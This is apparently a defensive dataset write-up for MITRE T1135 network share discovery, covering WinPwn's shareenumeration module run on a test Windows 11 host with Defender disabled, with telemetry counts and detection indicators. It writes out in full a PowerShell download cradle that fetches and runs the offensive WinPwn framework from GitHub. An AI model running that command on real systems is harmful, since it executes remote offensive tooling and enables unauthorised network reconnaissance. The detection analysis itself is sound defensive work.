# T1135-9: Network Share Discovery — WinPwn shareenumeration

## Technique Context

Network Share Discovery (T1135) using WinPwn's `shareenumeration` module packages share discovery functionality in a PowerShell-based post-exploitation framework. WinPwn is a collection of offensive PowerShell modules that wraps and integrates multiple tools; `shareenumeration` provides share discovery via a dynamically downloaded framework rather than a locally staged script. The command `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput` first downloads the full WinPwn framework at runtime, then invokes the share enumeration module in non-interactive mode. When Defender is enabled, it blocks WinPwn after a DNS query resolves `raw.githubusercontent.com` and the download begins, generating an EID 4100 error event. With Defender disabled, the download and execution proceed unimpeded.

## What This Dataset Contains

With Windows Defender disabled, this dataset captures WinPwn's `shareenumeration` module executing from a domain-joined Windows 11 workstation (ACME-WS06.acme.local).

**Process execution chain:** The defended dataset described the execution: PowerShell → child PowerShell with command `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput}`. Security EID 4688 here records two `whoami.exe` child processes from the parent PowerShell (PID 18148), both running as SYSTEM.

**PowerShell test framework completion:** 106 PowerShell events (104 EID 4104, 2 EID 4103) including the `Set-ExecutionPolicy Bypass` invocation. The Write-Host "DONE" completion marker appears in EID 4103, confirming the test framework completed — a clear contrast with the defended run (51 PowerShell events) where Defender blocked the WinPwn download with "This script contains malicious content" (EID 4100).

**Sysmon EID 1:** Two `whoami.exe` executions (PIDs 12728 and 18060) both spawned from PowerShell PID 18148, `User: NT AUTHORITY\SYSTEM`, `IntegrityLevel: System`.

**DLL loading:** Nine Sysmon EID 7 events cover the .NET CLR initialization (`mscoree.dll`, `mscoreei.dll`, `clr.dll`, `mscorlib.ni.dll`, `clrjit.dll`), `System.Management.Automation.ni.dll`, `urlmon.dll`, and Windows Defender DLLs. The `urlmon.dll` load confirms network operations were initialized.

**Named pipe and process access:** Sysmon EID 17 and two Sysmon EID 10 events (PowerShell accessing `whoami.exe` with `GrantedAccess: 0x1FFFFF`) are present.

**File artifact:** Sysmon EID 11 records a file write to `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive`, a normal PowerShell profile artifact.

The undefended dataset (15 Sysmon, 2 Security, 106 PowerShell) is considerably lighter than the defended run (37 Sysmon, 10 Security, 51 PowerShell). In the defended run, DNS query (EID 22) and the Defender block events added telemetry that is absent here.

## What This Dataset Does Not Contain

**WinPwn download and execution telemetry:** The download of WinPwn.ps1 from `raw.githubusercontent.com` and the subsequent execution of `shareenumeration` are logged in the 104 EID 4104 script block events, but those blocks are not surfaced in the samples here. The DNS query for `raw.githubusercontent.com` that appeared in the defended run's Sysmon EID 22 data is not present in the undefended samples — though the download succeeded (Defender would have blocked it otherwise).

**Network enumeration activity:** WinPwn's `shareenumeration` would generate LDAP queries to the domain controller and SMB connection attempts to domain hosts. No Sysmon EID 3 (network connection) or EID 22 (DNS query) events from the enumeration phase appear in the samples.

**Defender block event:** The defended run's EID 4100 PowerShell error ("This script contains malicious content and has been blocked by your antivirus software") is absent, as expected. Its absence is itself evidence that Defender was not active.

**Share enumeration results:** No events reveal which hosts were queried or which shares were discovered.

## Assessment

WinPwn's `shareenumeration` represents a download-cradle delivery model where the tool has no on-disk artifact prior to execution. This dataset confirms that the test framework ran to completion with Defender disabled. The primary detection opportunity is in the PowerShell script block log: the download URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/` and the `shareenumeration` function call are present in EID 4104 events.

The comparison with the defended variant is valuable for understanding the impact of Defender on telemetry volume: the defended run generated more events (including DNS, error events, and higher Sysmon counts) precisely because Defender's scanning and blocking created additional artifacts. The undefended execution is operationally quieter and would require proactive script block log analysis rather than relying on AV block alerts as a detection anchor.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104:** Download cradle pattern `(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...')` — the WinPwn GitHub URL is a high-fidelity indicator
- **PowerShell EID 4104:** `shareenumeration -noninteractive -consoleoutput` function invocation, uniquely associated with WinPwn
- **Security EID 4688 / Sysmon EID 1:** PowerShell running as SYSTEM spawning `whoami.exe` is anomalous on a domain workstation
- **Sysmon EID 7:** `urlmon.dll` loading into PowerShell preceding network activity is context for retrospective investigation
- **PowerShell EID 4103:** `Set-ExecutionPolicy Bypass -Scope Process` from SYSTEM context is a reliable indicator of automated adversarial execution
